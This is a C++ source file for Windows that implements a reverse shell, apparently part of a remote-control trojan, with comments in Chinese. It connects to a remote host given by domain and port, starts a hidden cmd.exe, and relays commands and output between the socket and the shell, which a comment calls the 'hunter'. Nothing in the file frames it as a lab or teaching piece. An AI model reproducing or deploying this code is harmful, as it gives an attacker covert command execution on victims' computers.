#include "pch.h"
#include "Shell.h"

#define SEND_SIZE   512
#define RESULT_SIZE 2048

static Shell gShell; // 初始化类
static SOCKET gSocket = SOCKET_ERROR; // 创建原始套接字 因为要使用一个异步的套接字
// 四个HANDLE 用来创建两个管道
static HANDLE ghReadPipe1, ghWritePipe1, ghReadPipe2, ghWritePipe2;
// 创建命令行进程之后拿到的pi 控制cmd进程
static PROCESS_INFORMATION gPi = { 0 };
// 准备缓存
// 准备缓存
static CHAR szSend[SEND_SIZE] = { 0 };
static CHAR szResult[RESULT_SIZE] = { 0 };

void Shell::startShell(std::string domain, int port) {
	// 设置并连接好非阻塞套接字
	if (!setAsySocket(domain, port)) {
		OutputDebugStringA("set asy socket failed\r\n");
	}

	// 启动子进程
	// 此时socket都已准备好
	if (!createCmd()) {
		OutputDebugStringA("create cmd exe failed\r\n");
		closesocket(gSocket);
		gSocket = SOCKET_ERROR;
		return;
	}
	// 创建沟通cmd和socket的线程函数
	HANDLE h = CreateThread(NULL, 0, Shell::threadProc, (LPVOID)NULL, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
		closesocket(gSocket);
		gSocket = SOCKET_ERROR;
		return;
	}
	OutputDebugStringA("start shell successfully\r\n");
}

// 启动cmd子进程
bool Shell::createCmd() {
	// 创建匿名管道
	SECURITY_ATTRIBUTES securityAttributes = { 0 };
	securityAttributes.bInheritHandle = TRUE;
	securityAttributes.nLength = sizeof(securityAttributes);
	securityAttributes.lpSecurityDescriptor = NULL;
	if ((!::CreatePipe(&ghReadPipe1, &ghWritePipe1, &securityAttributes, 0)) |
		(!::CreatePipe(&ghReadPipe2, &ghWritePipe2, &securityAttributes, 0))) {
		OutputDebugStringA("create pipe failed\r\n");
		return false;
	}

	// 因为会多次使用 所以要做好准备
	RtlZeroMemory(&gPi, sizeof(PROCESS_INFORMATION));
	// 创建cmd进程
	STARTUPINFOA si = { 0 };
	// 隐藏窗口
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	// 设置标准输入输出和错误到管道
	si.hStdInput = ghReadPipe2;
	si.hStdOutput = si.hStdError = ghWritePipe1;
	// 拼接启动命令行的命令
	CHAR szCmdLine[256] = { 0 };
	GetSystemDirectoryA(szCmdLine, sizeof(szCmdLine));
	StringCchCatA(szCmdLine, _countof(szCmdLine), "\\cmd.exe");
	if (CreateProcessA(szCmdLine, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &gPi) == 0)
	{
		CloseHandle(ghReadPipe1);
		CloseHandle(ghReadPipe2);
		CloseHandle(ghWritePipe1);
		CloseHandle(ghWritePipe2);
		return false;
	}

	return true;
}

// 线程函数 负责沟通管道和socket
DWORD Shell::threadProc(LPVOID args) {
	// 数据处理循环
	while (true)
	{
		// -------------------------------接收管道数据部分（命令回显）----------------------------
		DWORD dwBytesResult = 0;
		RtlZeroMemory(szResult, sizeof(szResult));
		// 先看有没有数据 防止没有数据还去读引起堵塞
		if (PeekNamedPipe(ghReadPipe1, szResult, sizeof(szResult), &dwBytesResult, NULL, NULL)) {
			// 有数据就读
			if (dwBytesResult) {
				RtlZeroMemory(szResult, sizeof(szResult));
				if (!ReadFile(ghReadPipe1, szResult, sizeof(szResult), &dwBytesResult, NULL)) {
					OutputDebugStringA("cannot read pipe\r\n");
					break;
				}

				// 读到了就发给hunter
				while (true) {
					// 非阻塞主要是用在读套接字 这里的非阻塞写是不得已
					int ret = send(gSocket, szResult, lstrlenA(szResult), 0);
					if (ret == SOCKET_ERROR)
					{
						int r = WSAGetLastError();
						// 还不可以写
						if (r == WSAEWOULDBLOCK)
						{
							// 对于写来说是一定要写的(前提是因为阻塞不可写的情况)
							continue;
						}
						else
						{
							OutputDebugStringA("cannot write socket and stop shell\r\n");
							// 出问题就走你
							CloseHandle(ghReadPipe1);
							CloseHandle(ghReadPipe2);
							CloseHandle(ghWritePipe1);
							CloseHandle(ghWritePipe2);
							TerminateProcess(gPi.hProcess, 0); // 一定要关闭子进程啊！！！！！
							CloseHandle(gPi.hProcess);
							closesocket(gSocket);
							gSocket = SOCKET_ERROR;
							return 1;
						}
					}
					else
					{
						// 写完就继续
						break;
					}
				}
			}
		}

		// -------------------------------接收套接字数据部分（命令输入）----------------------------

		// 接收命令
		RtlZeroMemory(szSend, sizeof(szSend));
		int ret = recv(gSocket, szSend, sizeof(szSend), 0);
		if (ret == SOCKET_ERROR)
		{
			int r = WSAGetLastError();
			if (r == WSAEWOULDBLOCK)
			{
				continue;
			}
			else
			{
				OutputDebugStringA("cannot read socket and stop shell\r\n");
				break;
			}
		}
		// 输入管道
		// 第三个参数填写要输入字符的数量即可
		DWORD dwBytesWrite = 0;
		if (!WriteFile(ghWritePipe2, szSend, lstrlenA(szSend), &dwBytesWrite, NULL)) {
			OutputDebugStringA("cannot write pipe\r\n");
			break;
		}
	}

	// 一旦发生错误就处理后事
	CloseHandle(ghReadPipe1);
	CloseHandle(ghReadPipe2);
	CloseHandle(ghWritePipe1);
	CloseHandle(ghWritePipe2);
	closesocket(gSocket);
	gSocket = SOCKET_ERROR;
	return 1;
}

// 设置非阻塞套接字
bool Shell::setAsySocket(std::string domain, int port) {
	unsigned long ul = 1;
	int ret;
	gSocket = socket(AF_INET, SOCK_STREAM, 0);
	// 设置为非阻塞套接字
	if (SOCKET_ERROR == ioctlsocket(gSocket, FIONBIO, (unsigned long*)&ul)) {
		OutputDebugStringA("set asy socket failed\r\n");
		return false;
	}
	// 连接工作
	std::string ip = TcpSocket::fromDomainToIP(domain);

	// 创建套接字 0表示先不指定协议
	if ((int)(gSocket = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR) {
		OutputDebugStringA("Failed to create socket ");
		OutputDebugStringA(ip.data());
		OutputDebugStringA("\r\n");

		closesocket(gSocket);
		gSocket = SOCKET_ERROR;
		return false;
	}
	struct sockaddr_in addr;
	// 设置地址和端口
	addr.sin_family = AF_INET;
	addr.sin_addr.S_un.S_addr = inet_addr(ip.data());
	addr.sin_port = htons(port);

	// 连接
	if (connect(gSocket, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
		OutputDebugStringA("Failed to connect to ");
		OutputDebugStringA(ip.data());
		OutputDebugStringA("\r\n");

		closesocket(gSocket);
		gSocket = SOCKET_ERROR;
		return false;
	}
}

